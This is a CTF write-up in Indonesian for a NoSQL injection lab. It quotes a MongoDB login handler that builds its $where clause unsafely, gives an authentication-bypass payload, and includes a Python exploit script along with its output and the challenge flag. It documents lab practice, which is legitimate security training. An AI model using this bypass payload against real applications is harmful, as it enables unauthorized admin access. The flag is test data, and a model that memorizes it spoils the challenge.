# WriteUp: Polisi Rahasia

## Overview

* **Judul:** Polisi Rahasia
* **Kategori:** Input Injection (NoSQL Injection)
* **Poin:** 500
* **Deskripsi:** Bisa ngga masuk ke aplikasi internal polisi rahasia Ostania meski lu ga tau credential-nya?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1337`

## Informasi Attachment

File yang diberikan adalah `ostania1.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Input Injection/Polisi Rahasia]
└─$ tree
.
├── ostania1.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`ostania1.yml`):**

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/ostania-sss1:latest
    ports:
      - "1337:3000"
    environment:
      - PWN=${PWN:-testuser}
    restart: unless-stopped

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose pada port **1337**.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Input Injection/Polisi Rahasia]
└─$ PWN=WanZKey docker compose -f ostania1.yml up -d --build

```

### 2. Source Code Analysis (White Box)

Dilakukan inspeksi terhadap source code aplikasi di dalam container Docker. Ditemukan kerentanan **NoSQL Injection (JavaScript Injection)** pada file `src/app.js`.

**Snippet Vulnerable (`src/app.js`):**

```javascript
app.get('/login', (req, res) => {
    const { username, password } = req.query;

    if (username !== undefined || password !== undefined) {
        // VULNERABILITY:
        // Input user dimasukkan langsung ke string JavaScript yang dieksekusi di MongoDB ($where)
        const whereClause = `this.username == '${username}' && this.password == '${password}'`;

        User.findOne({ $where: whereClause })
            .then(user => {
                // ... logic login
            })
    }
});

```

**Analisis Kerentanan:**

1. **Vulnerability:** NoSQL Injection via `$where`.
2. **Logic:** Aplikasi menggunakan operator `$where` yang mengeksekusi JavaScript di sisi database untuk mencocokkan dokumen. Input `username` dan `password` digabungkan menggunakan string concatenation tanpa sanitasi.
3. **Exploit:** Penyerang dapat menyisipkan kode JavaScript untuk memanipulasi logika boolean query.

### 3. Exploitation strategy

Tujuannya adalah membypass login tanpa mengetahui password. Kita dapat memanipulasi logika `&&` (AND) menjadi `||` (OR) untuk memaksa query bernilai `true`.

**Payload Analysis:**

* Input Username: `' || this.isAdmin == true || '`
* Input Password: `1234` (Sembarang)

**Query yang Tereksekusi di MongoDB:**

```javascript
this.username == '' || this.isAdmin == true || '' && this.password == '1234'

```

**Penjelasan Logika:**
Query akan mencari dokumen di mana `username` kosong ATAU `isAdmin` bernilai `true` ATAU (password cocok). Karena ada dokumen admin dengan `isAdmin: true` di database, kondisi ini terpenuhi dan sistem akan meloginkan kita sebagai admin.

### 4. Proof of Concept (Browser)

Payload dimasukkan langsung pada form login:

* **Operative ID:** `' || this.isAdmin == true || '`
* **Token:** `1234`

Hasilnya login berhasil dan diarahkan ke dashboard administrator yang memuat flag.

## Script Solver

Script Python untuk melakukan eksploitasi otomatis menggunakan library `requests`.

**File:** `exploit.py`

```python
import requests
import re

# Target URL (Port 1337)
BASE_URL = "http://localhost:1337"

def exploit():
    print(f"[*] Target: {BASE_URL}")
    print("[*] Vulnerability: NoSQL Injection via $where (JavaScript Injection)")
    
    # Payload NoSQL Injection
    # Menggunakan ' || this.isAdmin == true || ' untuk bypass autentikasi
    payload = "' || this.isAdmin == true || '"
    
    print(f"[*] Sending Payload: {payload}")
    
    s = requests.Session()
    
    try:
        # Parameter login
        params = {
            'username': payload,
            'password': 'randompassword'
        }
        
        # Kirim payload ke endpoint login
        r = s.get(f"{BASE_URL}/login", params=params)
        
        # Cek akses dashboard
        if "Dashboard" in r.text or r.url.endswith("/dashboard"):
            print("[+] Injection Successful! Logged in as Admin.")
            
            # Akses dashboard untuk mengambil flag
            if "flag" not in r.text:
                print("[*] Accessing Dashboard to retrieve flag...")
                r = s.get(f"{BASE_URL}/dashboard")
            
            # Parsing Flag dengan Regex
            if "pwn{" in r.text:
                flag = re.search(r'pwn\{.*?\}', r.text)
                if flag:
                    print("-" * 50)
                    print(f"[!!!] JACKPOT! FLAG: {flag.group(0)}")
                    print("-" * 50)
            else:
                print("[-] Login success but FLAG not found.")
        else:
            print("[-] Injection Failed.")
            
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Solver

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Input Injection/Polisi Rahasia]
└─$ ./exploit.py
[*] Target: http://localhost:1337
[*] Vulnerability: NoSQL Injection via $where (JavaScript Injection)
[*] Sending Payload: ' || this.isAdmin == true || '
[+] Injection Successful! Logged in as Admin.
[*] Accessing Dashboard to retrieve flag...
--------------------------------------------------
[!!!] JACKPOT! FLAG: pwn{49634dfe735f46a7efba5e72475b30f2}
--------------------------------------------------

```

## Flag

```
pwn{49634dfe735f46a7efba5e72475b30f2}

```
